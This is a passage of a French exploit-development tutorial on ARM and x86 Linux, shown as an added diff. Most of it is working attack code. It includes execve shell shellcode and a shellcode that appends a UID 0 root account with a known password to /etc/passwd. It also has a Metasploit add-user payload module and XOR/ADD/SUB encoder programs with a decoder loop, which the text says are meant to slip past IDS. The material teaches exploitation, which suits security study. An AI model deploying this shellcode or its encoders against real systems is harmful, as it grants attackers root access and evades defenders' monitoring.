+		        fprintf(stdout,"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
+		                       "\\x6c\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
+		                       "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
+		                       ,strlen(your_SC), atoi(argv[2]));
+
+		        for (int i=0;i<sizeof(your_SC)-1;i++){
+		        	your_SC[i] = your_SC[i]+atoi(argv[2]);
+		                fprintf(stdout,"\\x%.2x", your_SC[i]);
+		                }
+		        fprintf(stdout,"\n");
+		        }
+
+		 if(!strcmp(argv[1], "-sub"))
+		         {
+		         fprintf(stdout,"Encode : SUB %s\n", argv[2]);
+		         fprintf(stdout,"Encoded: \n");
+
+		         fprintf(stdout,"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
+		                        "\\x44\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
+		                        "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"
+		                        ,strlen(your_SC), atoi(argv[2]));
+
+		         for (int i=0;i<sizeof(your_SC)-1;i++){
+		                 your_SC[i] = your_SC[i]-atoi(argv[2]);
+		                 fprintf(stdout,"\\x%.2x", your_SC[i]);
+		                 }
+		         fprintf(stdout,"\n");
+		         }
+
+	return 0;
+	}
+
+
+_________________
+05 - Conclusion  \_____________________________________________________________
+
+
+De nos jours les failles de sécurité sont de plus en plus exploitées, malgré
+tous les types de sécurité mise en place par le kernel/compilateur (SSP, ASLR,
+NX, ASCII-ARMOR, etc), il est quand même possible de pouvoir executé du code
+arbitraire en mémoire, ces dernières ne font que ralantire l'exploitation.
+Par ailleur de nos jours les hackers sont de moin en moin perturbé par les
+techniques de sécurité mise en place.
+
+C'est pourquoi, la seul façon de sécurisé ses logiciel c'est de faire attention
+à l'utilisation des fonctions qu'on utilise (strcpy, memcpy, scanf, etc...).
+Même si le risque zero n'existe jamais...
+
+
+
+
+
+
+
+ ______              _                ______                    _          ______
+(_____ \            (_)  _           (_____ \               _  (_)        (_____ \
+ _____) )_____ ____  _ _| |_  ___     _____) )_____  ____ _| |_ _ _____     ____) )
+|  ____/| ___ |  _ \| (_   _)/ _ \   |  ____/(____ |/ ___|_   _) | ___ |   / ____/
+| |     | ____| |_| | | | |_| |_| |  | |     / ___ | |     | |_| | ____|  | (_____
+|_|     |_____)  __/|_|  \__)\___/   |_|     \_____|_|      \__)_|_____)  |_______)
+              |_|
+
+
+
+]=-----------------------------------------------{ Pepito 2011 deusième partie.
+
+
+Dans la première partie nous avons vue les exploitations possibles sur une
+architecture Linux x86 32 bits. Dans cette seconde partie nous allons aborder
+l'exploitation sur une architecture Linux ARM 32 bits.
+
+
+
+
+]=-----------------------------------------{ Présentation de l'architecture ARM
+
+
+L'architecture  ARM  était  initialement  destinée  à un ordinateur de la
+société Acorn, puis  elle  a  été  complétée  pour  devenir  une  offre
+indépendante pour le marché de l'électronique  embarquée.  ARM  est  l'acronyme
+de Advanced Risc Machine, précédemment Acorn Risc Machine.
+
+Le coeur le  plus  célèbre  est  l'ARM7TDMI qui comporte 3 niveaux de pipeline.
+De plus, le ARM7TDMI  dispose   d'un  second  jeu  d'instructions  appelé THUMB
+permettant  le codage d'instructions sur 16 bits et, ainsi, de réaliser un gain
+de  mémoire  important, notamment  pour  les  applications  embarquées.
+
+L'architecture  ARM  est également très répandue  dans  la  téléphonie  mobile.
+De  nombreux  systèmes  sont  portés  sur  cette architecture. À savoir Linux
+(qu'utilise notamment Maemo avec le N900   ou Android  avec le Nexus One),
+Symbian S60 avec les Nokia N97 ou Samsung Player HD, iPhone OS avec l'iPhone et
+l'iPad, et Windows Mobile.
+
+ARM Ltd a ensuite développé le coeur ARM9 qui comporte 5 niveaux de pipeline.
+Cela permet ainsi la réduction du nombre d'opérations logiques sur chaque cycle
+d'horloge et donc une amélioration des performances en vitesse.
+
+
+
+]=-------------------------------------{ Première approche avant l'exploitation
+
+
+Avant de parler de l'exploitation nous allons aborder le thème de la création
+de shellcode sous une architecture ARM.
+
+Tout au long du document, nos tests seront effectués sur un processeur de type
+ARM926EJ-S émulé via à "qemu-system-arm".
+
+Pour commencer, jetons un coup d'oeil sur la convention des registres.
+
+
+
+    Register  	Alt. Name  	Usage
+    r0 		a1 		First function argument Integer function result
+                                Scratch register
+    r1 		a2 		Second function argument Scratch register
+    r2 		a3 		Third function argument Scratch register
+    r3 		a4 		Fourth function argument Scratch register
+
+    r4 		v1 		Register variable
+    r5 		v2 		Register variable
+    r6 		v3 		Register variable
+    r7 		v4 		Register variable
+    r8 		v5 		Register variable
+    r9 		v6
+		rfp 		Register variable Real frame pointer
+
+    r10		sl 		Stack limit
+    r11		fp 		Argument pointer
+    r12		ip 		Temporary workspace
+    r13		sp 		Stack pointer
+    r14		lr 		Link register Workspace
+    r15		pc 		Program counter
+
+
+
+Donc les registres r0 à r3 seront destinés aux arguments placés dans nos
+fonctions. Les registres r4 à r9 seront utilisés pour des variables diverses.
+
+Cependant r7 est utilisé pour stocker l'adresse du syscall à exécuter.
+
+r13 est le registre qui pointe sur la stack et r15 celui qui pointe sur la
+prochaine adresse à exécuter.
+
+Ces deux registres pourraient être comparés aux registres ESP et EIP sous x86,
+malgré que l'exécution des registres entre x86 et ARM soit très différente.
+
+
+Commençons par écrire un shellcode qui va appeler le syscall _write puis
+ensuite _exit. (pour commencer doucement...)
+
+Tout d'abord nous devons connaître l'adresse des syscalls.
+Pour cela, comme d'habitude... :
+
+
+	root@ARM9:~# cat /usr/include/asm/unistd.h | grep write
+	#define __NR_write			(__NR_SYSCALL_BASE+  4)
+	#define __NR_writev			(__NR_SYSCALL_BASE+146)
+	#define __NR_pwrite64			(__NR_SYSCALL_BASE+181)
+	#define __NR_pciconfig_write		(__NR_SYSCALL_BASE+273)
+
+	root@ARM9:~# cat /usr/include/asm/unistd.h | grep exit
+	#define __NR_exit			(__NR_SYSCALL_BASE+  1)
+	#define __NR_exit_group			(__NR_SYSCALL_BASE+248)
+
+
+Ok, donc 4 pour _write et 1 pour _exit
+
+	Bilan :
+        =======
+	On sait que la fonction write utilise 3 arguments:
+
+        write(int __fd, __const void *__buf, size_t __n)
+
+	Donc, nous avons :
+
+	r0 => 1			(output)
+	r1 => shell-storm.org\n (string)
+	r2 => 16 		(strlen(string))
+	r7 => 4 		(syscall)
+
+	r0 => 0
+	r7 => 1
+
+
+	Voici ce que cela donne en asm:
+
+	root@ARM9:/home/jonathan/shellcode/write# cat write.s
+	.section .text
+	.global _start
+
+	_start:
+
+		# _write()
+		mov 	r2, #16         <= place 16 dans r2
+		mov	r1, pc		<= r1 = pc
+		add	r1, #24		<= r1 = pc + 24 (ce qui va
+                                           pointer sur notre string
+                                           shell-storm.org)
+		mov 	r0, $0x1	<= place 1 dans r0 pour stdout
+		mov 	r7, $0x4        <= syscall write dans r7
+		svc 	0
+
+		# _exit()
+		sub	r0, r0, r0      <= set r0 à zero
+		mov 	r7, $0x1        <= place 1 dans r7 (syscall exit)
+		svc	0               <= exec (int 0x80 sous x86)
+
+	.ascii "shell-storm.org\n"
+
+	root@ARM9:/home/jonathan/shellcode/write# as -o write.o write.s
+	root@ARM9:/home/jonathan/shellcode/write# ld -o write write.o
+	root@ARM9:/home/jonathan/shellcode/write# ./write
+	shell-storm.org
+	root@ARM9:/home/jonathan/shellcode/write#
+	root@ARM9:/home/jonathan/shellcode/write# strace ./write
+	execve("./write", ["./write"], [/* 17 vars */]) = 0
+	write(1, "shell-storm.org\n"..., 16shell-storm.org
+	)    = 16
+	exit(0)
+
+
+Jusqu'à maintenant, tout fonctionne correctement, cependant pour créer
+notre shellcode nous ne devons pas utiliser de null bytes, et notre code
+en est pourtant blindé.
+
+
+	root@ARM9:/home/jonathan/shellcode/write# objdump -d write
+
+	write:     file format elf32-littlearm
+
+
+	Disassembly of section .text:
+
+	00008054 <_start>:
+	   8054:	e3a02010   mov	   r2, #16	; 0x10
+	   8058:	e1a0100f   mov	   r1, pc
+	   805c:	e2811018   add	   r1, r1, #24
+	   8060:	e3a00001   mov	   r0, #1	; 0x1
+	   8064:	e3a07004   mov	   r7, #4	; 0x4
+	   8068:	ef000000   svc	   0x00000000
+	   806c:	e0400000   sub	   r0, r0, r0
+	   8070:	e3a07001   mov	   r7, #1	; 0x1
+	   8074:	ef000000   svc	   0x00000000
+	   8078:	6c656873   stclvs  8, cr6, [r5], #-460
+	   807c:	74732d6c   ldrbtvc r2, [r3], #-3436
+	   8080:	2e6d726f   cdpcs   2, 6, cr7, cr13, cr15, {3}
+	   8084:	0a67726f   beq     19e4a48 <__data_start+0x19d49c0>
+
+
+
+En ARM, il existe un mode appelé "Thumb Mode" qui permet de ramener toutes
+les instructions sur 16 bits au lieu de 32, ce qui va nous faciliter la vie.
+
+
+
+	root@ARM9:/home/jonathan/shellcode/write# cat write.s
+	.section .text
+	.global _start
+
+	_start:
+
+		.code 32
+		# Thumb-Mode on
+		add 	r6, pc, #1   <= place pc + 1 dans r6
+		bx	r6           <= bx (passage en thumb mode)
+
+		.code 	16
+		# _write()
+		mov 	r2, #16
+		mov	r1, pc
+		add	r1, #12
+		mov 	r0, $0x1
+		mov 	r7, $0x4
+		svc 	0
+
+		# _exit()
+		sub	r0, r0, r0
+		mov 	r7, $0x1
+		svc	0
+
+	.ascii "shell-storm.org\n"
+
+	root@ARM9:/home/jonathan/shellcode/write# as -mthumb -o write.o write.s
+	root@ARM9:/home/jonathan/shellcode/write# ld -o write write.o
+	root@ARM9:/home/jonathan/shellcode/write# ./write
+	shell-storm.org
+
+
+Si vous regardez bien, dans le code asm, nous avons changé la valeur de r1 sur
+l'instruction add au lieu d'avoir fait un "add r1, #24" , nous avons un "add r1, #12"
+car nous somme passé en "thumb mode".
+
+Du coup, l'adresse où est situé notre chaine est divisée par 2.
+
+Regardons ce que cela donne au niveau des null bytes:
+
+
+	root@ARM9:/home/jonathan/shellcode/write# objdump -d write
+
+	write:     file format elf32-littlearm
+
+
+	Disassembly of section .text:
+
+	00008054 <_start>:
+	    8054:	e28f6001 	add	r6, pc, #1
+	    8058:	e12fff16 	bx	r6
+	    805c:	2210      	movs	r2, #16
+	    805e:	4679      	mov	r1, pc
+	    8060:	310c      	adds	r1, #12
+	    8062:	2001      	movs	r0, #1
+	    8064:	2704      	movs	r7, #4
+	    8066:	df00      	svc	0
+	    8068:	1a00      	subs	r0, r0, r0
+	    806a:	2701      	movs	r7, #1
+	    806c:	df00      	svc	0
+	    806e:	6873      	ldr	r3, [r6, #4]
+	    8070:	6c65      	ldr	r5, [r4, #68]
+	    8072:	2d6c      	cmp	r5, #108
+	    8074:	7473      	strb	r3, [r6, #17]
+	    8076:	726f      	strb	r7, [r5, #9]
+	    8078:	2e6d      	cmp	r6, #109
+	    807a:	726f      	strb	r7, [r5, #9]
+	    807c:	0a67      	lsrs	r7, r4, #9
+
+
+C'est déjà un peu plus propre...
+Il nous reste plus qu'à modifier l'instruction "svc 0" et "sub r0, r0, r0"
+
+Pour SVC nous allons utiliser "svc 1" qui fonctionne parfaitement.
+
+Pour "sub r0, r0, r0" le but est de placer 0 dans le registre r0, nous ne
+pouvons pas faire un "mov r0, #0" car il contiendra aussi un null bytes.
+
+Le seul moyen que j'ai trouvé est de faire un:
+
+	sub r4, r4, r4
+	mov r0, r4
+
+Voici ce que cela donne:
+
+	root@ARM9:/home/jonathan/shellcode/write# cat write.s
+	.section .text
+	.global _start
+
+	_start:
+		.code 32
+
+		# Thumb-Mode on
+		add 	r6, pc, #1
+		bx	r6
+		.code 	16
+
+		# _write()
+		mov 	r2, #16
+		mov	r1, pc
+		add	r1, #14	   <==== Nous avons encore changé l'adresse,
+                                         car dans exit() nous avons rajouté
+		mov 	r0, $0x1         des lignes d'instructions, donc cela
+		mov 	r7, $0x4         décale la string.
+		svc 	1
+
+		# _exit()
+		sub	r4, r4, r4
+		mov	r0, r4
+		mov 	r7, $0x1
+		svc	1
+
+	.ascii "shell-storm.org\n"
+	root@ARM9:/home/jonathan/shellcode/write# as -mthumb -o write.o write.s
+	root@ARM9:/home/jonathan/shellcode/write# ld -o write write.o
+	root@ARM9:/home/jonathan/shellcode/write# ./write
+	shell-storm.org
+	root@ARM9:/home/jonathan/shellcode/write# strace ./write
+	execve("./write", ["./write"], [/* 17 vars */]) = 0
+	write(1, "shell-storm.org\n"..., 16shell-storm.org
+	)    = 16
+	exit(0)                                 = ?
+	root@ARM9:/home/jonathan/shellcode/write# objdump -d write
+
+	write:     file format elf32-littlearm
+
+
+	Disassembly of section .text:
+
+	00008054 <_start>:
+	    8054:	e28f6001 	add	r6, pc, #1	; 0x1
+	    8058:	e12fff16 	bx	r6
+	    805c:	2210      	movs	r2, #16
+	    805e:	4679      	mov	r1, pc
+	    8060:	310e      	adds	r1, #14
+	    8062:	2001      	movs	r0, #1
+	    8064:	2704      	movs	r7, #4
+	    8066:	df01      	svc	1
+	    8068:	1b24      	subs	r4, r4, r4
+	    806a:	1c20      	adds	r0, r4, #0
+	    806c:	2701      	movs	r7, #1
+	    806e:	df01      	svc	1
+	    8070:	6873      	ldr	r3, [r6, #4]
+	    8072:	6c65      	ldr	r5, [r4, #68]
+	    8074:	2d6c      	cmp	r5, #108
+	    8076:	7473      	strb	r3, [r6, #17]
+	    8078:	726f      	strb	r7, [r5, #9]
+	    807a:	2e6d      	cmp	r6, #109
+	    807c:	726f      	strb	r7, [r5, #9]
+	    807e:	0a67      	lsrs	r7, r4, #9
+
+
+
+Et bien voilà, nous avons un shellcode opérationnel sans aucun null bytes
+En C, cela donne:
+
+	root@ARM9:/home/jonathan/shellcode/write/C# cat write.c
+
+	#include <stdio.h>
+
+	char *SC = 	"\x01\x60\x8f\xe2"
+			"\x16\xff\x2f\xe1"
+			"\x10\x22"
+			"\x79\x46"
+			"\x0e\x31"
+			"\x01\x20"
+			"\x04\x27"
+			"\x01\xdf"
+			"\x24\x1b"
+			"\x20\x1c"
+			"\x01\x27"
+			"\x01\xdf"
+			"\x73\x68"
+			"\x65\x6c"
+			"\x6c\x2d"
+			"\x73\x74"
+			"\x6f\x72"
+			"\x6d\x2e"
+			"\x6f\x72"
+			"\x67\x0a";
+
+
+	int main(void)
+	{
+		fprintf(stdout,"Length: %d\n",strlen(SC));
+		(*(void(*)()) SC)();
+	return 0;
+	}
+
+	root@ARM9:/home/jonathan/shellcode/write/C# gcc -o write write.c
+	write.c: In function 'main':
+	write.c:28: warning: incompatible implicit declaration of built-in function 'strlen'
+	root@ARM9:/home/jonathan/shellcode/write/C# ./write
+	Length: 44
+	shell-storm.org
+
+
+	Maintenant, étudions un shellcode qui appelle execve()
+
+	La structure du code devrait avoir cette forme:
+
+	r0 => "//bin/sh"
+	r1 => "//bin/sh"
+	r2 => 0
+
+	r7 => 11
+
+
+	root@ARM9:/home/jonathan/shellcode/shell# cat shell.s
+	.section .text
+	.global _start
+	_start:
+		.code 32		//
+		add 	r3, pc, #1	// Toute cette section est pour
+		bx	r3		// le "Thumb Mode"
+		.code 16		//
+
+		mov 	r0, pc		// On place l'adresse de pc dans r0
+		add 	r0, #10		// et on y rajoute + 10 (qui va donc
+                                        // pointer sur //bin/sh)
+
+		str	r0, [sp, #4]	// ensuite on place cela sur la stack
+                                        // (pour le cas où on doit le réutiliser)
+
+		add     r1, sp, #4	// on reprend ce qu'on à placer sur
+                                        // la stack pour le mettre dans r1
+
+		sub	r2, r2, r2	// ou soustrait r2 par lui même (ce qui
+                                        // revient à mettre 0 dans r2)
+
+		mov 	r7, #11		// syscall execve dans r7
+		svc 	1		// on exécute
+
+	.ascii "//bin/sh"
+
+	root@ARM9:/home/jonathan/shellcode/shell# as -mthumb -o shell.o shell.s
+	root@ARM9:/home/jonathan/shellcode/shell# ld -o shell shell.o
+	root@ARM9:/home/jonathan/shellcode/shell# ./shell
+	# exit
+	root@ARM9:/home/jonathan/shellcode/shell#
+
+	On peut même vérifier que le shellcode ne contient aucun null bytes.
+
+	    8054:	e28f3001 	add	r3, pc, #1
+	    8058:	e12fff13 	bx	r3
+	    805c:	4678      	mov	r0, pc
+	    805e:	300a      	adds	r0, #10
+	    8060:	9001      	str	r0, [sp, #4]
+	    8062:	a901      	add	r1, sp, #4
+	    8064:	1a92      	subs	r2, r2, r2
+	    8066:	270b      	movs	r7, #11
+	    8068:	df01      	svc	1
+	    806a:	2f2f      	cmp	r7, #47
+	    806c:	6962      	ldr	r2, [r4, #20]
+	    806e:	2f6e      	cmp	r7, #110
+	    8070:	6873      	ldr	r3, [r6, #4]
+
+
+
+Bon voici ce qui en est pour la création d'un shellcode qui fait appel à execve,
+cependant vue que pepito est un daemon nous devons écrire un shellcode qui nous
+permetterais davoir la main sur le serveur à distance.
+
+Pour ça nous allons ajouté un compte root sur le system (dans le cas ou pepito
+est lancé en root avec le bit seuid (ce qui est rare))
+
+
+Voici le shellcode qui nous intéresse
+
+
+            /* Thumb mode */
+            "\x05\x50\x45\xe0"  /* sub  r5, r5, r5 */
+            "\x01\x50\x8f\xe2"  /* add  r5, pc, #1 */
+            "\x15\xff\x2f\xe1"  /* bx   r5 */
+
+            /* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 0644) = fd */
+            "\x78\x46"          /* mov  r0, pc */
+            "\x7C\x30"          /* adds r0, #124 */
+            "\xff\x21"          /* movs r1, #255 */
+            "\xff\x31"          /* adds r1, #255 */
+            "\xff\x31"          /* adds r1, #255 */
+            "\xff\x31"          /* adds r1, #255 */
+            "\x45\x31"          /* adds r1, #69 */
+            "\xdc\x22"          /* movs r2, #220 */
+            "\xc8\x32"          /* adds r2, #200 */
+            "\x05\x27"          /* movs r7, #5 */
+            "\x01\xdf"          /* svc  1 */
+
+            /* r8 = fd */
+            "\x80\x46"          /* mov  r8, r0 */
+
+            /* write(fd, "shell-storm:$1$KQYl/yru$PMt02zUTW"..., 72) */
+            "\x41\x46"          /* mov  r1, r8 */
+            "\x08\x1c"          /* adds r0, r1, #0 */
+            "\x79\x46"          /* mov  r1, pc */
+            "\x18\x31"          /* adds r1, #24 */
+            "\xc0\x46"          /* nop (mov r8, r8) */
+            "\x48\x22"          /* movs r2, #72 */
+            "\x04\x27"          /* movs r7, #4 */
+            "\x01\xdf"          /* svc  1 */
+
+            /* close(fd) */
+            "\x41\x46"          /* mov  r1, r8 */
+            "\x08\x1c"          /* adds r0, r1, #0 */
+            "\x06\x27"          /* movs r7, #6 */
+            "\x01\xdf"          /* svc  1 */
+
+            /* exit(0) */
+            "\x1a\x49"          /* subs r1, r1, r1 */
+            "\x08\x1c"          /* adds r0, r1, #0 */
+            "\x01\x27"          /* movs r7, #1 */
+            "\x01\xdf"          /* svc  1 */
+
+            /* shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:
+               /bin/bash\n */
+            "\x73\x68\x65\x6c\x6c\x2d\x73\x74\x6f\x72"
+            "\x6d\x3a\x24\x31\x24\x4b\x51\x59\x6c\x2f"
+            "\x79\x72\x75\x24\x50\x4d\x74\x30\x32\x7a"
+            "\x55\x54\x57\x6d\x4d\x76\x50\x57\x63\x55"
+            "\x34\x6f\x51\x4c\x73\x2f\x3a\x30\x3a\x30"
+            "\x3a\x72\x6f\x6f\x74\x3a\x2f\x72\x6f\x6f"
+            "\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73"
+            "\x68\x0a"
+
+            /* /etc/passwd */
+            "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+
+
+Le shellcode ci-dessus créer un compte root avec l'utilisateur shell-storm et
+comme password "toor", voici un module metasploit pour pouvoir moduler ce
+shellcode à votre guise.
+
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+###
+#
+# AddUser
+# -------
+#
+# Adds a UID 0 user to /etc/passwd.
+#
+###
+module Metasploit3
+
+	include Msf::Payload::Single
+	include Msf::Payload::Linux
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Linux Add User',
+			'Version'       => '$Revision: 12045 $',
+			'Description'   => 'Create a new user with UID 0',
+			'Author'        => [ 'Jonathan Salwan' ],
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'linux',
+			'Arch'          => ARCH_ARMLE,
+			'Privileged'    => true))
+
+		# Register adduser options
+		register_options(
+			[
+				OptString.new('USER',  [ true,  "The username to create",     "metasploit" ]),
+				OptString.new('PASS',  [ true,  "The password for this user", "metasploit" ]),
+				OptString.new('SHELL', [ false, "The shell for this user",    "/bin/sh"    ]),
+			], self.class)
+	end
+
+	#
+	# Dynamically builds the adduser payload based on the user's options.
+	#
+	def generate_stage
+		user    = datastore['USER']  || 'metasploit'
+		pass    = datastore['PASS']  || 'metasploit'
+		shell   = datastore['SHELL'] || '/bin/sh'
+		str     = "#{user}:#{pass.crypt('Az')}:0:0::/:#{shell}\n"
+		strl1   = [ (str.length)+52 ].pack('C*')
+		strl2   = [ str.length ].pack('C*')
+		pwdir   = "/etc/passwd"
+		payload =
+			"\x05\x50\x45\xe0\x01\x50\x8f\xe2\x15\xff\x2f\xe1" +
+			"\x78\x46"+ strl1 + "\x30\xff\x21\xff\x31\xff\x31" +
+			"\xff\x31\x45\x31\xdc\x22\xc8\x32\x05\x27\x01\xdf" +
+			"\x80\x46\x41\x46\x08\x1c\x79\x46\x18\x31\xc0\x46" +
+			strl2 + "\x22\x04\x27\x01\xdf\x41\x46\x08\x1c\x06" +
+			"\x27\x01\xdf\x1a\x49\x08\x1c\x01\x27\x01\xdf" +
+			str + pwdir
+
+	end
+
+end
+
+
+Ce module est dans la version 3.6 de metasploit.
+
+Dans la partie 1 nous avons vue l'interêt du polymorphisme, nous allons donc
+appliquer la même chose pour ARM.
+
+
+Chiffrement
+-----------
+
+Pour le chiffrement, il suffit d'effectuer une opération basique sur
+chaque octet. and, orr, eor, add, sub par exemple.
+
+Prenons le shellcode (write et exit).
+
+	    "\x01\x60\x8f\xe2\x16\xff\x2f\xe1"
+	    "\x10\x22\x79\x46\x0e\x31\x01\x20"
+	    "\x04\x27\x01\xdf\x24\x1b\x20\x1c"
+	    "\x01\x27\x01\xdf"
+	    "shell-storm.org"
+	    "\x0a"
+
+Nous allons simplement soustraire 2 à tous les octets,
+ce qui nous donne :
+
+	    "\xff\x5e\x8d\xe0\x14\xfd\x2d\xdf"
+	    "\x0e\x20\x77\x44\x0c\x2f\xff\x1e"
+	    "\x02\x25\xff\xdd\x22\x19\x1e\x1a"
+	    "\xff\x25\xff\xdd"
+	    "qfcjj+qrmpk,mpe"
+	    "\x08"
+
+Nous avons donc notre shellcode chiffré, il reste à construire
+notre boucle de décodage.
+
+
+Décodage
+--------
+
+Le principe est le même que pour x86. Nous sautons juste avant notre shellcode
+chiffré. Puis nous sautons dans une boucle de décodage en gardant en mémoire
+l'adresse de notre shellcode. La boucle décode chaque octet puis resaute dans
+le shellcode.
+
+
+			add  r6, pc, #36     // nous récupérons dans r6 l'adresse du saut avant notre shellcode (bl debut).  -----------------+
+			bx   r6              // b seul contient des 00 c'est pour cela que nous sautons à r6 à l'aide de bx.                  |
+	debut:  	mov  r4, #213        // #213 sert au compteur de boucle, il faut que la boucle s'effectue 44 fois.                    |
+		        	             // c'est le nombre d'octets de notre shellcode .                                                 |
+	boucle: 	cmp  r4, #256        // la comparaison se fait à 256 ce qui permet d'éliminer un 00 car 256 est sur deux octets.      |
+			bxhi lr              // si r4 = 256 alors nous sautons à notre shellcode qui a été décodé.                            |
+			sub  r4, r4, #213    // sinon nous soustrayons 213 afin de récupérer la valeur du compteur.                           |
+			ldrb r5, [lr, r4]    // nous récupérons dans r5 l'octet situé à l'adresse de notre shellcode + le compteur.           |
+			add  r5, r5, #2      // nous décodons en y ajoutant 2.                                                                |
+			strb r5, [lr, r4]    // puis nous remplaçons l'octet par celui décodé.                                                |
+			add  r4, r4, #214    // nous réajoutons 213 + 1 afin d'incrémenter le compteur pour faire la futur comparaison.       |
+			b    boucle          // et nous sautons à la comparaison.                                                             |
+				                                                                                                              |
+			bl   debut           // nous sautons dans la boucle à l'aide de bl, afin de placer l'adresse du shellcode dans lr. <--+
+
+
+Et voilà, nous avons notre boucle de décodage sans null byte.
+
+Voici un scripte qui encode votre shellcode sans vous prendre la tête pour
+créer votre bouclde de décodage.
+
+Nous allons donc encoder notre shellcode qui ajoute le compte root sur notre
+"machine victime".
+
+
+#include <stdio.h>
+#include <stdio.h>
+
+
+unsigned char your_SC[] = "\x05\x50\x45\xe0\x01\x50\x8f\xe2\x15\xff\x2f\xe1\x78\x46"
+                          "\x5d\x30\xff\x21\xff\x31\xff\x31\xff\x31\x45\x31\xdc\x22"
+                          "\xc8\x32\x05\x27\x01\xdf\x80\x46\x41\x46\x08\x1c\x79\x46"
+                          "\x18\x31\xc0\x46\x29\x22\x04\x27\x01\xdf\x41\x46\x08\x1c"
+                          "\x06\x27\x01\xdf\x1a\x49\x08\x1c\x01\x27\x01\xdf\x73\x68"
+                          "\x65\x6c\x6c\x2d\x73\x74\x6f\x72\x6d\x3a\x41\x7a\x37\x55"
+                          "\x7a\x4c\x39\x35\x37\x50\x66\x4e\x4d\x3a\x30\x3a\x30\x3a"
+                          "\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x2f\x65\x74"
+                          "\x63\x2f\x70\x61\x73\x73\x77\x64";
+
+void syntax(void)
+{
+	fprintf(stdout,"\nSyntax:  ./encode <type> <value>\n\n");
+	fprintf(stdout,"Type:    -xor\n");
+	fprintf(stdout,"         -add\n");
+	fprintf(stdout,"         -sub\n\n");
+	fprintf(stdout,"Exemple: ./encode -xor 20\n\n");
+	exit(1);
+}
+
+int main(int argc, char *argv[])
+{
+	if(argc != 3){
+		syntax();
+		return 1;
+		}
+
+
+	if(!strcmp(argv[1], "-xor"))
+		{
+		fprintf(stdout,"Encode : XOR %s\n", argv[2]);
+		fprintf(stdout,"Encoded: \n");
+
+		int num  = (256-strlen(your_SC))+1;
+		int num2 = num + 1;
+
+		fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
+            			"\\x16\\xff\\x2f\\xe1"
+            			"\\x%.2x\\x40\\xa0\\xe3"
+            			"\\x01\\x0c\\x54\\xe3"
+            			"\\x1e\\xff\\x2f\\x81"
+            			"\\x%.2x\\x40\\x44\\xe2"
+            			"\\x04\\x50\\xde\\xe7"
+            			"\\x%.2x\\x50\\x25\\xe2"
+            			"\\x04\\x50\\xce\\xe7"
+            			"\\x%.2x\\x40\\x84\\xe2"
+            			"\\xf7\\xff\\xff\\xea"
+            			"\\xf5\\xff\\xff\\xeb"
+				,num, num, atoi(argv[2]), num2);
+
+		for (int i=0;i<sizeof(your_SC)-1;i++){
+			your_SC[i] = your_SC[i]^atoi(argv[2]);
+			fprintf(stdout,"\\x%.2x", your_SC[i]);
+			}
+		fprintf(stdout,"\n");
+		}
+
+
+        if(!strcmp(argv[1], "-add"))
+                {
+                fprintf(stdout,"Encode : ADD %s\n", argv[2]);
+                fprintf(stdout,"Encoded: \n");
+
+                int num  = (256-strlen(your_SC))+1;
+                int num2 = num + 1;
+
+                fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
+                                "\\x16\\xff\\x2f\\xe1"
+                                "\\x%.2x\\x40\\xa0\\xe3"
+                                "\\x01\\x0c\\x54\\xe3"
+                                "\\x1e\\xff\\x2f\\x81"
+                                "\\x%.2x\\x40\\x44\\xe2"
+                                "\\x04\\x50\\xde\\xe7"
+                                "\\x%.2x\\x50\\x45\\xe2"
+                                "\\x04\\x50\\xce\\xe7"
+                                "\\x%.2x\\x40\\x84\\xe2"
+                                "\\xf7\\xff\\xff\\xea"
+                                "\\xf5\\xff\\xff\\xeb"
+                                ,num, num, atoi(argv[2]), num2);
+
+                for (int i=0;i<sizeof(your_SC)-1;i++){
+                        your_SC[i] = your_SC[i]+atoi(argv[2]);
+                        fprintf(stdout,"\\x%.2x", your_SC[i]);
+                        }
+                fprintf(stdout,"\n");
+                }
+
+        if(!strcmp(argv[1], "-sub"))
+                {
+                fprintf(stdout,"Encode : SUB %s\n", argv[2]);
+                fprintf(stdout,"Encoded: \n");
+
+                int num  = (256-strlen(your_SC))+1;
+                int num2 = num + 1;
+
+                fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
+                                "\\x16\\xff\\x2f\\xe1"
+                                "\\x%.2x\\x40\\xa0\\xe3"
+                                "\\x01\\x0c\\x54\\xe3"
+                                "\\x1e\\xff\\x2f\\x81"
+                                "\\x%.2x\\x40\\x44\\xe2"
+                                "\\x04\\x50\\xde\\xe7"
+                                "\\x%.2x\\x50\\x85\\xe2"
+                                "\\x04\\x50\\xce\\xe7"
+                                "\\x%.2x\\x40\\x84\\xe2"
+                                "\\xf7\\xff\\xff\\xea"
+                                "\\xf5\\xff\\xff\\xeb"
+                                ,num, num, atoi(argv[2]), num2);
+
+                for (int i=0;i<sizeof(your_SC)-1;i++){
+                        your_SC[i] = your_SC[i]-atoi(argv[2]);
+                        fprintf(stdout,"\\x%.2x", your_SC[i]);
+                        }
+                fprintf(stdout,"\n");
+                }
+
+return 0;
+}
+
+
+Nous avons maintenant un shellcode encodé qui poura donc passer
+à travère les IDS.
+
+
+	"\x24\x60\x8f\xe2\x16\xff\x2f\xe1\x89\x40\xa0\xe3\x01\x0c\x54\xe3"
+	"\x1e\xff\x2f\x81\x89\x40\x44\xe2\x04\x50\xde\xe7\x0c\x50\x25\xe2"
+	"\x04\x50\xce\xe7\x8a\x40\x84\xe2\xf7\xff\xff\xea\xf5\xff\xff\xeb"
